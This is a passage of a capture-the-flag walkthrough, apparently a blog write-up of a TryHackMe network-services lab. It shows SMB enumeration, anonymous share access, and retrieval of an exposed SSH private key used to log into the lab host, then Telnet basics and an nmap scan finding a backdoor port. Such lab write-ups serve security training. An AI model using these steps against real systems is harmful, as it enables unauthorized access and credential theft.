+</span></span><span class=line><span class=cl><span class=ne>RID</span> <span class=ne>Range</span> <span class=o>........</span> <span class=mi>500</span><span class=o>-</span><span class=mi>550</span><span class=p>,</span><span class=mi>1000</span><span class=o>-</span><span class=mi>1050</span>
+</span></span><span class=line><span class=cl><span class=n>Username</span> <span class=o>.........</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>Password</span> <span class=o>.........</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>Known</span> <span class=n>Usernames</span> <span class=o>..</span> <span class=n>administrator</span><span class=p>,</span> <span class=n>guest</span><span class=p>,</span> <span class=n>krbtgt</span><span class=p>,</span> <span class=n>domain</span> <span class=n>admins</span><span class=p>,</span> <span class=n>root</span><span class=p>,</span> <span class=n>bin</span><span class=p>,</span> <span class=n>none</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>====================================================</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Enumerating</span> <span class=n>Workgroup</span><span class=o>/</span><span class=n>Domain</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>78.132</span>    <span class=o>|</span>
+</span></span><span class=line><span class=cl> <span class=o>====================================================</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Got</span> <span class=n>domain</span><span class=o>/</span><span class=n>workgroup</span> <span class=n>name</span><span class=p>:</span> <span class=n>WORKGROUP</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>WORKGROUP</code></p><ol start=4><li>What comes up as the <strong>name</strong> of the machine?</li></ol><p><code>POLOSMB</code></p><ol start=5><li>What operating system <strong>version</strong> is running?</li></ol><p><code>6.1</code></p><ol start=6><li>What share sticks out as something we might want to investigate?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ smbclient -L //10.10.78.132
+</span></span><span class=line><span class=cl>Enter WORKGROUP\kali&#39;s password:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        Sharename       Type      Comment
+</span></span><span class=line><span class=cl>        ---------       ----      -------
+</span></span><span class=line><span class=cl>        netlogon        Disk      Network Logon Service
+</span></span><span class=line><span class=cl>        profiles        Disk      Users profiles
+</span></span><span class=line><span class=cl>        print$          Disk      Printer Drivers
+</span></span><span class=line><span class=cl>        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
+</span></span><span class=line><span class=cl>SMB1 disabled -- no workgroup available
+</span></span></code></pre></td></tr></table></div></div><p><code>profiles</code></p><h2 id=task-4-exploiting-smb>Task 4 Exploiting SMB<a hidden class=anchor aria-hidden=true href=#task-4-exploiting-smb>#</a></h2><p><strong>Types of SMB Exploit</strong></p><p>While there are vulnerabilities such as <a href=https://www.cvedetails.com/cve/CVE-2017-7494/>CVE-2017-7494</a> that can allow remote code execution by exploiting SMB, you&rsquo;re more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we&rsquo;re going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.</p><p><strong>Method Breakdown</strong></p><p>So, from our enumeration stage, we know:</p><ul><li>The SMB share location</li><li>The name of an interesting SMB share</li></ul><p><strong>SMBClient</strong></p><p>Because we&rsquo;re trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it&rsquo;s part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation here.</p><p>We can remotely access the SMB share using the syntax:</p><p>&ldquo;<code>smbclient //[IP]/[SHARE]</code>&rdquo;</p><p>Followed by the tags:</p><ul><li><code>-U [name]</code> : to specify the user</li><li><code>-p [port]</code> : to specify the port</li></ul><p><strong>Got it? Okay, let&rsquo;s do this!</strong></p><ol><li>What would be the correct syntax to access an SMB share called &ldquo;secret&rdquo; as user &ldquo;suit&rdquo; on a machine with the IP 10.10.10.2 on the default port?</li></ol><p><code>smbclient //10.10.10.2/secret -U suit -p 139</code></p><ol start=2><li>Great! Now you&rsquo;ve got a hang of the syntax, let&rsquo;s have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ smbclient //10.10.78.132/profiles
+</span></span><span class=line><span class=cl>Enter WORKGROUP\kali&#39;s password:
+</span></span><span class=line><span class=cl>Try &#34;help&#34; to get a list of possible commands.
+</span></span><span class=line><span class=cl>smb: \&gt;
+</span></span></code></pre></td></tr></table></div></div><p><code>No answer needed</code></p><ol start=3><li>Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn&rsquo;t require authentication to view the files. We can do this easily by:</li></ol><ul><li>using the username &ldquo;Anonymous&rdquo;</li><li>connecting to the share we found during the enumeration stage</li><li>and not supplying a password.</li></ul><p>Does the share allow anonymous access? Y/N?</p><p><code>Y</code></p><ol start=4><li>Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>smb: \&gt; ls
+</span></span><span class=line><span class=cl>  .                                   D        0  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  ..                                  D        0  Tue Apr 21 12:49:56 2020
+</span></span><span class=line><span class=cl>  .cache                             DH        0  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  .profile                            H      807  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  .sudo_as_admin_successful           H        0  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  .bash_logout                        H      220  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  .viminfo                            H      947  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  Working From Home Information.txt      N      358  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  .ssh                               DH        0  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  .bashrc                             H     3771  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  .gnupg                             DH        0  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                12316808 blocks of size 1024. 7583776 blocks available
+</span></span><span class=line><span class=cl>smb: \&gt; get &#34;Working From Home Information.txt&#34;
+</span></span><span class=line><span class=cl>getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (2.4 KiloBytes/sec) (average 2.4 KiloBytes/sec)
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ cat Working\ From\ Home\ Information.txt
+</span></span><span class=line><span class=cl>John Cactus,
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>As you&#39;re well aware, due to the current pandemic most of POLO inc. has insisted that, wherever
+</span></span><span class=line><span class=cl>possible, employees should work from home. As such- your account has now been enabled with ssh
+</span></span><span class=line><span class=cl>access to the main server.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>If there are any problems, please contact the IT department at it@polointernalcoms.uk
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Regards,
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>James
+</span></span><span class=line><span class=cl>Department Manager
+</span></span></code></pre></td></tr></table></div></div><p><code>John Cactus</code></p><ol start=5><li>What service has been configured to allow him to work from home?</li></ol><p><code>ssh</code></p><ol start=6><li>Okay! Now we know this, what directory on the share should we look in?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>smb: \&gt; cd .ssh
+</span></span><span class=line><span class=cl>smb: \.ssh\&gt; ls
+</span></span><span class=line><span class=cl>  .                                   D        0  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  ..                                  D        0  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  id_rsa                              A     1679  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  id_rsa.pub                          N      396  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>  authorized_keys                     N        0  Tue Apr 21 13:08:23 2020
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                12316808 blocks of size 1024. 7584028 blocks available
+</span></span><span class=line><span class=cl>smb: \.ssh\&gt;
+</span></span></code></pre></td></tr></table></div></div><p><code>.ssh</code></p><ol start=7><li>This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?</li></ol><p><code>id_rsa</code></p><ol start=8><li>Download this file to your local machine, and change the permissions to &ldquo;600&rdquo; using &ldquo;chmod 600 [file]&rdquo;.</li></ol><p>Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.</p><p>What is the smb.txt flag?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ cat id_rsa.pub
+</span></span><span class=line><span class=cl>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Network</span> <span class=n>Services</span><span class=o>$</span> <span class=n>ssh</span> <span class=o>-</span><span class=n>i</span> <span class=n>id_rsa</span> <span class=n>cactus</span><span class=err>@</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>78.132</span>
+</span></span><span class=line><span class=cl><span class=n>Welcome</span> <span class=n>to</span> <span class=n>Ubuntu</span> <span class=mf>18.04</span><span class=o>.</span><span class=mi>4</span> <span class=n>LTS</span> <span class=p>(</span><span class=n>GNU</span><span class=o>/</span><span class=n>Linux</span> <span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>96</span><span class=o>-</span><span class=n>generic</span> <span class=n>x86_64</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Documentation</span><span class=p>:</span>  <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>help</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span>
+</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Management</span><span class=p>:</span>     <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>landscape</span><span class=o>.</span><span class=n>canonical</span><span class=o>.</span><span class=n>com</span>
+</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Support</span><span class=p>:</span>        <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>advantage</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>System</span> <span class=n>information</span> <span class=n>as</span> <span class=n>of</span> <span class=n>Wed</span> <span class=n>Oct</span> <span class=mi>21</span> <span class=mi>22</span><span class=p>:</span><span class=mi>57</span><span class=p>:</span><span class=mi>37</span> <span class=n>UTC</span> <span class=mi>2020</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>System</span> <span class=nb>load</span><span class=p>:</span>  <span class=mf>0.0</span>                <span class=n>Processes</span><span class=p>:</span>           <span class=mi>93</span>
+</span></span><span class=line><span class=cl>  <span class=n>Usage</span> <span class=n>of</span> <span class=o>/</span><span class=p>:</span>   <span class=mf>33.3</span><span class=o>%</span> <span class=n>of</span> <span class=mf>11.75</span><span class=n>GB</span>   <span class=n>Users</span> <span class=n>logged</span> <span class=ow>in</span><span class=p>:</span>     <span class=mi>0</span>
+</span></span><span class=line><span class=cl>  <span class=n>Memory</span> <span class=n>usage</span><span class=p>:</span> <span class=mi>17</span><span class=o>%</span>                <span class=ne>IP</span> <span class=n>address</span> <span class=k>for</span> <span class=n>eth0</span><span class=p>:</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>78.132</span>
+</span></span><span class=line><span class=cl>  <span class=n>Swap</span> <span class=n>usage</span><span class=p>:</span>   <span class=mi>0</span><span class=o>%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>22</span> <span class=n>packages</span> <span class=n>can</span> <span class=n>be</span> <span class=n>updated</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>0</span> <span class=n>updates</span> <span class=n>are</span> <span class=n>security</span> <span class=n>updates</span><span class=o>.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Last</span> <span class=n>login</span><span class=p>:</span> <span class=n>Tue</span> <span class=n>Apr</span> <span class=mi>21</span> <span class=mi>11</span><span class=p>:</span><span class=mi>19</span><span class=p>:</span><span class=mi>15</span> <span class=mi>2020</span> <span class=n>from</span> <span class=mf>192.168</span><span class=o>.</span><span class=mf>1.110</span>
+</span></span><span class=line><span class=cl><span class=n>cactus</span><span class=err>@</span><span class=n>polosmb</span><span class=p>:</span><span class=o>~$</span> <span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=n>smb</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=n>cactus</span><span class=err>@</span><span class=n>polosmb</span><span class=p>:</span><span class=o>~$</span> <span class=n>cat</span> <span class=n>smb</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=n>THM</span><span class=p>{</span><span class=n>smb_is_fun_eh</span><span class=err>?</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>cactus</span><span class=err>@</span><span class=n>polosmb</span><span class=p>:</span><span class=o>~$</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>THM{smb_is_fun_eh?}</code></p><h2 id=task-5-understanding-telnet>Task 5 Understanding Telnet<a hidden class=anchor aria-hidden=true href=#task-5-understanding-telnet>#</a></h2><p><strong>What is Telnet?</strong></p><p>Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that&rsquo;s hosting a telnet server.</p><p>The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.</p><p><strong>Replacement</strong></p><p>Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.</p><p><strong>How does Telnet work?</strong></p><p>The user connects to the server by using the Telnet protocol, which means entering &ldquo;telnet&rdquo; into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: &ldquo;telnet [ip] [port]&rdquo;</p><ol><li>What is Telnet?</li></ol><p><code>application protocol</code></p><ol start=2><li>What has slowly replaced Telnet?</li></ol><p><code>SSH</code></p><ol start=3><li>How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?</li></ol><p><code>telnet 10.10.10.3 23</code></p><ol start=4><li>The lack of what, means that all Telnet communication is in plaintext?</li></ol><p><code>encryption</code></p><h2 id=task-6-enumerating-telnet>Task 6 Enumerating Telnet<a hidden class=anchor aria-hidden=true href=#task-6-enumerating-telnet>#</a></h2><p><strong>Lets Get Started</strong></p><p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!</p><p><strong>Enumeration</strong></p><p>We&rsquo;ve already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don&rsquo;t always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method.</p><p><strong>Port Scanning</strong></p><p>Let&rsquo;s start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with nmap and the tag -A and -p-.</p><p><strong>Tag</strong></p><ul><li>-A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one</li><li>-p- : Enables scanning across all ports, not just the top 1000</li></ul><p><strong>Output</strong></p><p>Let&rsquo;s see what&rsquo;s going on on the target server&mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ sudo nmap -p- -sS -sC -sV -Pn -O 10.10.221.224
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 20:49 CET
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.221.224
+</span></span><span class=line><span class=cl>Host is up (0.037s latency).
+</span></span><span class=line><span class=cl>Not shown: 65534 closed ports
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>8012/tcp open  unknown
+</span></span><span class=line><span class=cl>| fingerprint-strings:
+</span></span><span class=line><span class=cl>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
+</span></span><span class=line><span class=cl>|_    SKIDY&#39;S BACKDOOR. Type .HELP to view commands
+</span></span><span class=line><span class=cl>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class=line><span class=cl>SF-Port8012-TCP:V=7.80%I=7%D=10/25%Time=5F95D704%P=x86_64-pc-linux-gnu%r(N
+</span></span><span class=line><span class=cl>SF:ULL,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comman
+</span></span><span class=line><span class=cl>SF:ds\n&#34;)%r(GenericLines,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to
+</span></span><span class=line><span class=cl>SF:\x20view\x20commands\n&#34;)%r(GetRequest,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type
+</span></span><span class=line><span class=cl>SF:\x20\.HELP\x20to\x20view\x20commands\n&#34;)%r(HTTPOptions,2E,&#34;SKIDY&#39;S\x20B
+</span></span><span class=line><span class=cl>SF:ACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n&#34;)%r(RTSPRequest
+</span></span><span class=line><span class=cl>SF:,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\
+</span></span><span class=line><span class=cl>SF:n&#34;)%r(RPCCheck,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20vie
+</span></span><span class=line><span class=cl>SF:w\x20commands\n&#34;)%r(DNSVersionBindReqTCP,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20T
+</span></span><span class=line><span class=cl>SF:ype\x20\.HELP\x20to\x20view\x20commands\n&#34;)%r(DNSStatusRequestTCP,2E,&#34;S
+</span></span><span class=line><span class=cl>SF:KIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n&#34;)%r(
+</span></span><span class=line><span class=cl>SF:Help,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comma
+</span></span><span class=line><span class=cl>SF:nds\n&#34;)%r(SSLSessionReq,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20
+</span></span><span class=line><span class=cl>SF:to\x20view\x20commands\n&#34;)%r(TerminalServerCookie,2E,&#34;SKIDY&#39;S\x20BACKDO
+</span></span><span class=line><span class=cl>SF:OR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n&#34;)%r(TLSSessionReq,2E
+</span></span><span class=line><span class=cl>SF:,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n&#34;)
+</span></span><span class=line><span class=cl>SF:%r(Kerberos,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x
+</span></span><span class=line><span class=cl>SF:20commands\n&#34;)%r(SMBProgNeg,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP
+</span></span><span class=line><span class=cl>SF:\x20to\x20view\x20commands\n&#34;)%r(X11Probe,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20
+</span></span><span class=line><span class=cl>SF:Type\x20\.HELP\x20to\x20view\x20commands\n&#34;)%r(FourOhFourRequest,2E,&#34;SK
+</span></span><span class=line><span class=cl>SF:IDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n&#34;)%r(L
+</span></span><span class=line><span class=cl>SF:PDString,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20c
+</span></span><span class=line><span class=cl>SF:ommands\n&#34;)%r(LDAPSearchReq,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP
+</span></span><span class=line><span class=cl>SF:\x20to\x20view\x20commands\n&#34;)%r(LDAPBindReq,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\
+</span></span><span class=line><span class=cl>SF:x20Type\x20\.HELP\x20to\x20view\x20commands\n&#34;)%r(SIPOptions,2E,&#34;SKIDY&#39;
+</span></span><span class=line><span class=cl>SF:S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n&#34;)%r(LANDe
+</span></span><span class=line><span class=cl>SF:sk-RC,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comm
+</span></span><span class=line><span class=cl>SF:ands\n&#34;)%r(TerminalServer,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x20\.HELP\x
+</span></span><span class=line><span class=cl>SF:20to\x20view\x20commands\n&#34;)%r(NCP,2E,&#34;SKIDY&#39;S\x20BACKDOOR\.\x20Type\x2
+</span></span><span class=line><span class=cl>SF:0\.HELP\x20to\x20view\x20commands\n&#34;);
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=10/25%OT=8012%CT=1%CU=38185%PV=Y%DS=2%DC=I%G=Y%TM=5F95
+</span></span><span class=line><span class=cl>OS:D7AA%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
+</span></span><span class=line><span class=cl>OS:OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508
+</span></span><span class=line><span class=cl>OS:ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
+</span></span><span class=line><span class=cl>OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
+</span></span><span class=line><span class=cl>OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
+</span></span><span class=line><span class=cl>OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
+</span></span><span class=line><span class=cl>OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
+</span></span><span class=line><span class=cl>OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
+</span></span><span class=line><span class=cl>OS:%CD=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
